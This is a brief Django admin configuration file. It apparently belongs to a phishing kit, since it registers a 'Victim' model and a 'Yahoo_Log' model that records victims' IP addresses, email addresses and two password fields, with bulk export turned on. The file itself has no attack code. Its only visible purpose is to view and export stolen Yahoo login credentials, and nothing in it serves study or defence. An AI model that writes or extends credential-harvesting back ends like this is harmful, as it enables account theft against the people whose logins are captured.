from django.contrib import admin
from . import models
from import_export.admin import ImportExportModelAdmin

class VictimAdmin(admin.ModelAdmin):
    list_display = ('id','ip','code')

class LogAdmin(ImportExportModelAdmin):
    list_display = ('id','ip','mail','psw1','psw2')


admin.site.register(models.Victim,VictimAdmin)
admin.site.register(models.Yahoo_Log,LogAdmin)
